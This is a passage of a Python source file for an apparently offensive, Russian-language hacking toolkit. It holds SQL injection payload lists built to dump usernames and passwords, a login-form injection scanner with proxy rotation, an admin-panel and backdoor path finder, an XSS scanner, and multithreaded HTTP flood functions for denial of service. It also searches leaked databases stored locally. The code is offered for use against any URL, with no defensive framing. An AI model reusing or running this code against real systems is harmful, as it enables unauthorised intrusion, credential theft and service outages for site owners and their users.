        f"' AND {generate_random_string(6)} LIKE '%{generate_random_string(6)}%' -- ",
        f"' OR {generate_random_string(6)} IS NULL -- ",
        f"' OR {generate_random_string(6)} IN (SELECT {generate_random_string(6)} FROM {generate_random_string(6)}) -- ",
        f"' UNION SELECT NULL, {generate_random_string(6)} -- ",
        f"' AND {generate_random_string(6)} BETWEEN {generate_random_string(6)} AND {generate_random_string(6)} -- ",
        f"' OR (SELECT {generate_random_string(6)} FROM {generate_random_string(6)}) IS NOT NULL -- ",
        f"' AND {generate_random_string(6)} NOT IN (SELECT {generate_random_string(6)} FROM {generate_random_string(6)}) -- ",
        f"' OR {generate_random_string(6)} = (SELECT MAX({generate_random_string(6)}) FROM {generate_random_string(6)}) -- ",
        f"' OR {generate_random_string(6)} LIKE '{generate_random_string(6)}%' -- ",
        f"' AND {generate_random_string(6)} = (SELECT {generate_random_string(6)} FROM {generate_random_string(6)} WHERE {generate_random_string(6)} = '1') -- ",
        f"' UNION ALL SELECT {generate_random_string(6)}, {generate_random_string(6)} -- ",
        f"' AND (SELECT 1 WHERE {generate_random_string(6)} = '1') -- ",
        f"' OR {generate_random_string(6)} = (SELECT {generate_random_string(6)} FROM {generate_random_string(6)} LIMIT 1) -- ",
        f"' AND {generate_random_string(6)} > (SELECT COUNT(*) FROM {generate_random_string(6)}) -- ",
        f"' OR {generate_random_string(6)} IN (1, 2, 3) -- ",
        f"' AND {generate_random_string(6)} = (SELECT {generate_random_string(6)} FROM {generate_random_string(6)} WHERE {generate_random_string(6)} IS NOT NULL) -- ",
        f"' OR {generate_random_string(6)} NOT LIKE '{generate_random_string(6)}%' -- ",
        f"' UNION SELECT {generate_random_string(6)}, 'invalid' -- ",
        f"' OR {generate_random_string(6)} IS NOT NULL AND {generate_random_string(6)} = '1' -- ",
        f"' AND (SELECT {generate_random_string(6)} FROM {generate_random_string(6)} WHERE {generate_random_string(6)} = '1') IS NULL -- ",
        f"' OR {generate_random_string(6)} = (SELECT {generate_random_string(6)} FROM {generate_random_string(6)} WHERE {generate_random_string(6)} IS NULL) -- ",
        f"' AND {generate_random_string(6)} IN (SELECT NULL FROM {generate_random_string(6)}) -- ",
        f"' OR (SELECT {generate_random_string(6)} FROM {generate_random_string(6)}) = '1' -- ",
        f"' AND {generate_random_string(6)} = (SELECT COUNT(*) FROM {generate_random_string(6)}) -- ",
        f"' OR (SELECT {generate_random_string(6)} FROM {generate_random_string(6)}) > 0 -- ",
        f"' AND {generate_random_string(6)} < (SELECT MIN({generate_random_string(6)}) FROM {generate_random_string(6)}) -- ",
        f"' OR {generate_random_string(6)} LIKE '%{generate_random_string(6)}' -- ",
        f"' AND {generate_random_string(6)} IS NULL OR {generate_random_string(6)} = '1' -- ",
        f"' UNION SELECT {generate_random_string(6)}, {generate_random_string(6)} FROM {generate_random_string(6)} -- ",
        f"' AND (SELECT {generate_random_string(6)} FROM {generate_random_string(6)}) IS NULL -- ",
        f"' AND {generate_random_string(6)} = {generate_random_string(6)} UNION SELECT {generate_random_string(6)}, {generate_random_string(6)} -- ",
        f"' OR {generate_random_string(6)} IN (SELECT {generate_random_string(6)} FROM {generate_random_string(6)}) AND {generate_random_string(6)} = '1' -- ",
        f"' OR {generate_random_string(6)} = (SELECT {generate_random_string(6)} FROM {generate_random_string(6)} WHERE {generate_random_string(6)} LIKE '%{generate_random_string(6)}%' -- ",
        f"' OR (SELECT {generate_random_string(6)} FROM {generate_random_string(6)}) IN (SELECT {generate_random_string(6)} FROM {generate_random_string(6)}) -- ",
        f"' AND EXISTS (SELECT {generate_random_string(6)} FROM {generate_random_string(6)}) -- ",
        f"' OR {generate_random_string(6)} = '1' AND {generate_random_string(6)} = '2' -- ",
        f"' AND ({generate_random_string(6)} = {generate_random_string(6)} OR {generate_random_string(6)} = {generate_random_string(6)}) -- ",
        f"' OR {generate_random_string(6)} = {generate_random_string(6)} AND {generate_random_string(6)} = {generate_random_string(6)} -- "
    ]

    injection_templates = [
        "' OR 1=1 -- ",
        "' OR 'a' = 'a' -- ",
        "' AND username = 'admin' -- ",
        "' AND password = 'password' -- ",
        "' OR EXISTS(SELECT 1 FROM users WHERE username='admin' AND password='password') -- ",
        "' OR (SELECT password FROM users WHERE username='admin') = 'password' -- ",
        "' AND (SELECT COUNT(*) FROM users WHERE username='admin') > 0 -- ",
        "' UNION SELECT username, password FROM users -- ",
        "' UNION SELECT null, password FROM users WHERE username='admin' -- ",
        "' UNION SELECT username, password FROM users WHERE username='admin' -- ",
        f"' UNION SELECT username, password FROM users WHERE username='{generate_random_string(6)}' -- ",
        "' OR (SELECT 1 FROM users WHERE username='admin' AND password='password') -- ",
        "' OR (SELECT password FROM users WHERE username='admin') IS NOT NULL -- ",
        "' AND (SELECT password FROM users WHERE username='admin') = 'adminpassword' -- ",
        "' OR (SELECT 1 FROM users WHERE username='admin' AND password='adminpassword') = 1 -- ",
        "' AND (SELECT password FROM users WHERE username='admin') = (SELECT password FROM users WHERE username='admin') -- ",
        "' UNION SELECT username, password FROM users WHERE username='admin' LIMIT 1 -- ",
        "' UNION SELECT username, password FROM users WHERE username='admin' ORDER BY 1 -- ",
        "' AND username='admin' AND password LIKE '%admin%' -- ",
        "' AND password LIKE '%password%' -- ",
        "' OR 1=1 -- ",
        f"' UNION SELECT username, password FROM users WHERE username LIKE '{generate_random_string(6)}' -- ",
        "' OR (SELECT password FROM users WHERE username='admin') = (SELECT password FROM users WHERE username='admin') -- ",
        "' UNION SELECT username, password FROM users WHERE username='admin' LIMIT 0, 1 -- ",
        "' AND username='admin' AND password='adminpassword' -- ",
        "' AND EXISTS (SELECT 1 FROM users WHERE username='admin' AND password='adminpassword') -- ",
    ]

    if payload_type == 'scan_payload':
        templates = scan_templates
    elif payload_type == 'injection_payload':
        templates = injection_templates
    else:
        raise ValueError(
            "Invalid payload type. Use 'scan_payload' or 'injection_payload'.")

    payloads = []
    for _ in range(num_payloads):
        payloads.append(random.choice(templates))

    return payloads


def sql_injection_scanner(payload_type='scan_payload'):
    url = input(f"{Color.LIGHT_BLUE}url for scan: {Color.RESET}")
    try:
        num_payloads = int(
            input(f"{Color.LIGHT_BLUE}number of payloads: {Color.RESET}"))
    except ValueError:
        print(f'{Color.RED}only numbers!{Color.RESET}')
        return
    username_field = input(f'{Color.BLUE}username field name: {Color.RESET}')
    password_field = input(f'{Color.BLUE}password field name: {Color.RESET}')
    use_proxy = input(
        f"{Color.GREEN}Use proxy? (y/n): {Color.RESET}").strip().lower()
    proxies = None
    if use_proxy == 'y':
        try:
            proxy_count = int(
                input(f"{Color.GREEN}How many proxies do you want to use? {Color.RESET}"))
        except:
            print(f'{Color.RED}numbers!{Color.RESET}')
            return
        proxy_list = []
        for _ in range(proxy_count):
            proxy = input(
                f"{Color.GREEN}Enter proxy (format: http://proxy_ip:proxy_port): {Color.RESET}").strip()
            proxy_list.append(proxy)
    error_keywords = [
        "error", "syntax", "unexpected", "unclosed", "SQL", "database", "query",
        "warning", "exception", "incorrect", "missing", "fatal", "invalid", "server",
        "malformed", "cannot", "failed", "unknown column", "out of range", "unrecognized",
        "injection", "internal server", "permission denied", "too many connections"
    ]
    payloads = generate_sql_payloads(num_payloads, payload_type)
    for payload in payloads:
        data = {
            username_field: 'test',
            password_field: payload
        }
        proxy = None
        if proxy_list:
            proxy = random.choice(proxy_list)
            proxies = {
                "http": proxy,
                "https": proxy
            }
        try:
            response = requests.post(url, data=data, proxies=proxies)
            if any(keyword in response.text.lower() for keyword in error_keywords):
                print(
                    f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} {Color.LIGHT_RED}Уязвимость найдена! c Пейлоадом: {Color.LIGHT_RED}{payload}{Color.RESET}")
            else:
                print(
                    f"{Color.DARK_GRAY}[{Color.GREEN}★{Color.DARK_GRAY}]{Color.GREEN} {Color.LIGHT_GREEN}Нет уязвимости для пейлоада: {Color.LIGHT_GREEN}{payload}{Color.RESET}")
        except requests.exceptions.RequestException as e:
            print(f"{Color.DARK_RED}Ошибка при подключении: {Color.RESET}{e}")


class Color:
    DARK_RED = '\033[31m'
    DARK_GRAY = '\033[90m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    LIGHT_RED = '\033[91m'
    RED = '\033[91m'
    GRAY = '\033[37m'
    LIGHT_GREEN = '\033[92m'
    GREEN = '\033[92m'
    DARK_GREEN = '\033[32m'
    LIGHT_PURPLE = '\033[95m'
    PURPLE = '\033[95m'
    DARK_PURPLE = '\033[35m'
    LIGHT_BLUE = '\033[94m'
    BLUE = '\033[94m'
    DARK_BLUE = '\033[34m'


DARK_RED = '\033[31m'
DARK_GRAY = '\033[90m'
WHITE = '\033[97m'
RESET = '\033[0m'
LIGHT_RED = '\033[91m'
RED = '\033[91m'
GRAY = '\033[37m'
LIGHT_GREEN = '\033[92m'
GREEN = '\033[92m'
DARK_GREEN = '\033[32m'
LIGHT_PURPLE = '\033[95m'
PURPLE = '\033[95m'
DARK_PURPLE = '\033[35m'
LIGHT_BLUE = '\033[94m'
BLUE = '\033[94m'
DARK_BLUE = '\033[34m'


class Color:
    LIGHT_RED = '\033[91m'
    RED = '\033[91m'
    DARK_RED = '\033[31m'
    LIGHT_GREEN = '\033[92m'
    GREEN = '\033[92m'
    DARK_GREEN = '\033[32m'
    LIGHT_BLUE = '\033[94m'
    BLUE = '\033[94m'
    DARK_BLUE = '\033[34m'
    LIGHT_PURPLE = '\033[95m'
    PURPLE = '\033[95m'
    DARK_PURPLE = '\033[35m'
    GRAY = '\033[37m'
    DARK_GRAY = '\033[90m'
    WHITE = '\033[97m'
    RESET = '\033[0m'


primary_color = Color.RED
secondary_color = Color.LIGHT_RED
tertiary_color = Color.DARK_RED
gray_color = Color.DARK_GRAY
current_color_scheme = 'red'


def find_admin_panel():
    url = input(
        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.RED} Enter the URL to search for the admin panel: ")
    if not (url.startswith("http://") or url.startswith("https://")):
        print(f"{Color.DARK_RED}[!]{Color.RESET} Incorrect URL")
        return
    admin_paths = [
        "admin", "admin.php", "administrator", "admin/login", "login", "admin_panel", "admin_area",
        "admin_login", "admin/index.php", "admincp", "user", "controlpanel", "dashboard", "panel",
        "manage", "admin_area.php", "panel.php", "adminhome", "login.php", "admin-console", "backend",
        "adminpanel", "cpanel", "member", "backend.php", "webadmin", "siteadmin", "admin1",
        "administrator.php", "control", "auth", "admin/dashboard", "secure", "system", "system/login",
        "user/login", "manage.php", "manager", "login/manager", "admin_area/index.php", "user/index.php",
        "admin/secure", "admin_area.php/login", "control_panel", "admin_dashboard.php", "sysadmin",
        "user_console", "user/dashboard", "adminarea", "server", "admin/console.php", "admin/security",
        "login/admin.php", "portal", "management", "secure_area", "admin_area/dashboard", "private_area",
        "user/admin", "admin_panel.php", "login.php/admin", "admin/dashboard.php", "manager/login",
        "portal/admin", "control/manage", "admincp/manage", "private/manage", "private/admin",
        "backdoor", "backdoor.php", "shell", "admin/auth", "user/admin.php"
    ]
    print(
        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Search for admin panels for: {url}")
    for path in admin_paths:
        full_url = f"{url.rstrip('/')}/{path.strip()}"
        try:
            response = requests.get(full_url, timeout=5)
            if response.status_code == 200 and ("login" in response.text or "admin" in response.text):
                print(
                    f"{Color.GREEN}[+]{Color.RESET} Admin panel found: {full_url}")
            else:
                print(
                    f"{Color.LIGHT_RED}[-]{Color.RESET} Verified: {full_url} - admin panel not found.")
        except Exception as e:
            print(
                f"{Color.DARK_RED}[!]{Color.RESET} Error: {full_url} - {str(e)}")


def search_mac_address(mac_address):
    url = f"https://api.macvendors.com/{mac_address}"
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            print(
                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Manufacturer: {response.text}")
        else:
            print(
                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} No information found for MAC address: {mac_address}")
    except requests.exceptions.RequestException as e:
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Error fetching data for MAC address: {e}")


def xss_scan():
    if not os.path.exists('payloads'):
        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Directory with payloads ('payloads') not exist. Please create it and add file with payloads('xsspayloads.txt')")
        return
    xss_payloads_path = os.path.join('payloads', 'xsspayloads.txt')
    if not os.path.isfile(xss_payloads_path):
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} File with payloads not found")
        return
    try:
        with open(xss_payloads_path, encoding='utf-8') as file:
            payloads = [line.strip() for line in file if line.strip()]
    except Exception as e:
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Error reading payloads file: {e}")
        return
    if not payloads:
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} No payloads found in the file.")
        return
    print(
        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Loaded Payloads: {len(payloads)}")
    url = input(
        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{RED} Enter URL for scan: ")
    entity_conversion = input(
        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Use entity conversion to HTML? (y/n): ").strip().lower()
    print(
        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Starting XSS scan on: {url}")
    attempt = 1
    for payload in payloads:
        if entity_conversion == 'y' or entity_conversion == 'Y':
            payload = html.escape(payload)
        test_url = f"{url}?q={payload}"
        try:
            response = requests.get(test_url, timeout=5)
            if payload in response.text:
                sys.stdout.write(
                    f"\rattempt: {attempt} Payload: {payload} status: found Potential XSS vulnerability on {test_url}")
                sys.stdout.flush()
                print(
                    f"\n{Color.DARK_GRAY}[{Color.DARK_RED}{attempt}{Color.DARK_GRAY}]{Color.LIGHT_RED} Potential XSS vulnerability found with payload: {payload} url - {test_url}")
            else:
                sys.stdout.write(
                    f"\rattempt: {attempt} Payload: {payload} status: not found found XSS vulnerability")
                sys.stdout.flush()
                attempt += 1
        except requests.exceptions.RequestException as e:
            print(
                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Error testing URL: {e}")
    print(
        f"\n{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} XSS scan completed.")


def check_url(url):
    try:
        response = requests.get(url, timeout=5, allow_redirects=True)
        if len(response.history) > 0:
            print(
                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} URL has redirects:")
            for resp in response.history:
                print(
                    f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} {resp.status_code} - {resp.url}")
            print(
                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Final destination: {response.status_code} - {response.url}")
        else:
            print(
                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} No redirects. URL is direct.")
    except requests.exceptions.RequestException as e:
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Error checking URL: {e}")


def generate_random_headers():
    headers = {
        'User-Agent': random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15'
        ]),
        'Accept-Language': random.choice(['en-US,en;q=0.5', 'en-GB,en;q=0.9', 'ru-RU,ru;q=0.9', 'fr-FR,fr;q=0.9']),
        'Referer': random.choice(['https://www.google.com/', 'https://www.bing.com/', 'https://www.yahoo.com/']),
        'Connection': 'keep-alive',
        'Accept': '*/*'
    }
    return headers


def dos_ip(ip_address, duration, threads):
    end_time = time.time() + duration * 60
    success_count = 0
    failure_count = 0

    def dos(ip):
        nonlocal success_count, failure_count
        while time.time() < end_time:
            try:
                url = f"http://{ip}"
                requests.get(url, headers=generate_random_headers())
                success_count += 1
            except requests.exceptions.RequestException:
                failure_count += 1

    print(
        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Starting attack on IP {ip_address} for {duration} minutes with {threads} threads...")

    threads_list = []
    for _ in range(threads):
        thread = threading.Thread(target=dos, args=(ip_address,))
        thread.start()
        threads_list.append(thread)

    show_progress_bar(duration)

    for thread in threads_list:
        thread.join()

    print(
        f"\n{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Attack finished!")
    print(
        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Successful requests: {success_count}")
    print(
        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Failed requests: {failure_count}")


def show_progress_bar(duration):
    start_time = time.time()
    end_time = start_time + duration * 60
    while time.time() < end_time:
        elapsed_time = time.time() - start_time
        remaining_time = end_time - time.time()
        progress = elapsed_time / (duration * 60)
        bar_length = 50
        filled_length = int(bar_length * progress)
        bar = Color.DARK_RED + '█' * filled_length + '-' * \
            (bar_length - filled_length) + Color.RESET
        percent = int(progress * 100)
        sys.stdout.write(
            f'\r[{bar}] {percent}% seconds {remaining_time:.2f} left')
        sys.stdout.flush()
        time.sleep(1)
    print(
        f"\n{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Attack completed.")


def dos_attack(link, duration, threads):
    end_time = time.time() + duration * 60
    success_count = 0
    failure_count = 0

    def dos(link):
        nonlocal success_count, failure_count
        while time.time() < end_time:
            try:
                requests.get(link, headers=generate_random_headers())
                success_count += 1
            except requests.exceptions.RequestException:
                failure_count += 1

    print(
        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Starting attack on {link} for {duration} minutes with {threads} threads...")

    threads_list = []
    for _ in range(threads):
        thread = threading.Thread(target=dos, args=(link,))
        thread.start()
        threads_list.append(thread)

    show_progress_bar(duration)

    for thread in threads_list:
        thread.join()

    print(
        f"\n{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Attack finished!")
    print(
        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Successful requests: {success_count}")
    print(
        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Failed requests: {failure_count}")


def check_site():
    website = input(
        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Enter website URL (e.g., https://example.com): {Color.RESET}")
    if not website.startswith('http'):
        website = 'http://' + website
    try:
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Checking availability...")
        start_time = time.time()
        response = requests.get(website)
        end_time = time.time()
        response_time = end_time - start_time
        if response.status_code == 200:
            print(
                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Website is available!")
            print(
                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Status Code: {response.status_code}")
            print(
                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Response Time: {response_time:.2f} seconds")
        else:
            print(
                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Website is not available.")
            print(
                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Status Code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Error checking website: {e}")
    input(
        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Press Enter...")


def get_proxy():
    proxy_api_url = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all"
    try:
        response = requests.get(proxy_api_url)
        if response.status_code == 200:
            proxy_list = response.text.strip().split("\r\n")
            return proxy_list
        else:
            print(
                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Failed to fetch proxy list. Status code: {response.status_code}")
    except Exception as e:
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Error fetching proxy list: {e}")
    return None


def get_website_info(domain):
    try:
        domain_info = whois.whois(domain)
        print_string = f"""
{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Website Information:
{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Domain: {domain_info.domain_name}
{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Registered: {domain_info.creation_date}
{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Expires: {domain_info.expiration_date}
{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Owner: {domain_info.registrant_name}
{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Organization: {domain_info.registrant_organization}
{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Address: {domain_info.registrant_address}
{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} City: {domain_info.registrant_city}
{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} State: {domain_info.registrant_state}
{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Postal Code: {domain_info.registrant_postal_code}
{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Country: {domain_info.registrant_country}
{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} IP Address: {domain_info.name_servers}
        """
        print(print_string)
    except Exception as e:
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Error: {e}\n")


def search_database():
    if not os.path.exists('bd'):
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Directory 'bd' does not exist. Please create it and add files for searching.")
        return
    count = len(os.listdir('bd'))
    print(
        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} {count} databases found.\n")
    data = input(
        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{RED} Enter data to search: ")
    print(
        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{RED} Searching...\n")
    result = ''
    for label in os.listdir('bd'):
        bd_path = os.path.join('bd', label)
        try:
            with open(bd_path, encoding='UTF-8') as f:
                header = f.readline().strip()
                if ',' in header:
                    header = header.split(',')
                elif ';' in header:
                    header = header.split(';')
                else:
                    header = [header]
                for line in f:
                    if data in line:
                        formatted_result = f"{Color.DARK_RED}┌───────────────{LIGHT_RED}{label}{Color.DARK_RED}───────────────\n"
                        formatted_result += f"{Color.DARK_RED}│ {RED}Matched Data: \n"
                        if ',' in line:
                            line_parts = line.strip().split(',')
                        elif ';' in line:
                            line_parts = line.strip().split(';')
                        else:
                            line_parts = [line.strip()]
                        for i in range(len(line_parts)):
                            if i < len(header):
                                header_name = header[i]
                            else:
                                header_name = f"Field {i + 1}"
                            formatted_result += f"{Color.DARK_RED}│ {Color.LIGHT_RED}{header_name}: {line_parts[i].strip()}\n"
                        formatted_result += f"{Color.DARK_RED}└──────────────────────────────────────────────────────\n"
                        result += formatted_result
                        break
        except Exception as e:
            print(
                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Error reading file {label}: {e}")
    print(
        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{RED} Search completed!\n")
    if result:
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Search Results:\n")
        print(result)
    else:
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{RED} No matches found.")


def change_color_scheme(scheme):
    global current_color_scheme
    if scheme == 'green':
        Color.LIGHT_RED = Color.LIGHT_GREEN
        Color.RED = Color.GREEN
        Color.DARK_RED = Color.DARK_GREEN
    elif scheme == 'blue':
        Color.LIGHT_RED = Color.LIGHT_BLUE
        Color.RED = Color.BLUE
        Color.DARK_RED = Color.DARK_BLUE
    elif scheme == 'purple':
        Color.LIGHT_RED = Color.LIGHT_PURPLE
        Color.RED = Color.PURPLE
        Color.DARK_RED = Color.DARK_PURPLE
    elif scheme == 'yellow':
        Color.LIGHT_RED = '\033[93m'
        Color.RED = '\033[33m'
        Color.DARK_RED = '\033[33m'
    elif scheme == 'cyan':
        Color.LIGHT_RED = '\033[96m'
        Color.RED = '\033[36m'
        Color.DARK_RED = '\033[36m'
    elif scheme == 'grayscale':
        Color.LIGHT_RED = '\033[97m'
        Color.RED = '\033[90m'
        Color.DARK_RED = '\033[97m'
    else:
        Color.LIGHT_RED = '\033[91m'
        Color.RED = '\033[91m'
        Color.DARK_RED = '\033[31m'
    current_color_scheme = scheme


def gradient_text(text, color_scheme):
    color_schemes = {
        'red': [LIGHT_RED, RED, DARK_RED, DARK_GRAY, GRAY],
        'green': [LIGHT_GREEN, GREEN, DARK_GREEN, DARK_GRAY, GRAY],
        'blue': [LIGHT_BLUE, BLUE, DARK_BLUE, DARK_GRAY, GRAY],
        'purple': [LIGHT_PURPLE, PURPLE, DARK_PURPLE, DARK_GRAY, GRAY],
        'yellow': ['\033[93m', '\033[33m', '\033[33m', DARK_GRAY, GRAY],
        'cyan': ['\033[96m', '\033[36m', '\033[36m', DARK_GRAY, GRAY],
        'grayscale': ['\033[37m', '\033[37m', '\033[37m', '\033[90m', '\033[90m']
    }
    selected_colors = color_schemes.get(color_scheme, color_schemes['red'])
    num_colors = len(selected_colors)
    gradient_steps = max(len(text) // num_colors, 1)
    gradient_result = ""
    for i, char in enumerate(text):
        color_index = min(i // gradient_steps, num_colors - 1)
        gradient_result += f"{selected_colors[color_index]}{char}"
    return f"{gradient_result}{RESET}"


banner_text = """

        S.       .S_SSSs     .S  sdSS_SSSSSSbs    sSSs_sSSs     .S S.    .S S.   
        SS.     .SS~SSSSS   .SS  YSSS~S%SSSSSP   d%%SP~YS%%b   .SS SS.  .SS SS.  
        S%S     S%S   SSSS  S%S       S%S       d%S'     `S%b  S%S S%S  S%S S%S  
        S%S     S%S    S%S  S%S       S%S       S%S       S%S  S%S S%S  S%S S%S  
        S&S     S%S SSSS%S  S&S       S&S       S&S       S&S  S%S S%S  S%S S%S  
        S&S     S&S  SSS%S  S&S       S&S       S&S       S&S   SS SS    SS SS   
        S&S     S&S    S&S  S&S       S&S       S&S       S&S    S_S      S_S    
        S&S     S&S    S&S  S&S       S&S       S&S       S&S   SS~SS    SS~SS   
        S*b     S*S    S&S  S*S       S*S       S*b       d*S  S*S S*S  S*S S*S  
        S*S.    S*S    S*S  S*S       S*S       S*S.     .S*S  S*S S*S  S*S S*S  
         SSSbs  S*S    S*S  S*S       S*S        SSSbs_sdSSS   S*S S*S  S*S S*S  
          YSSP  SSS    S*S  S*S       S*S         YSSP~YSSY    S*S S*S  S*S S*S  
                       SP   SP        SP                       SP       SP       
                       Y    Y         Y                        Y        Y        
                                                                         
"""

intro = """

          ⠀⠀⠀⠀⠀⠀⠀⠀⠴⣷⣶⣤⣀⠀⠀⠀⠀⠀⢀⣠⣤⣴⣶⣶⣾⣶⣶⣶⣶⣶⣦⣤⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
          ⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣷⣄⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣴⣾⣿⣶⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
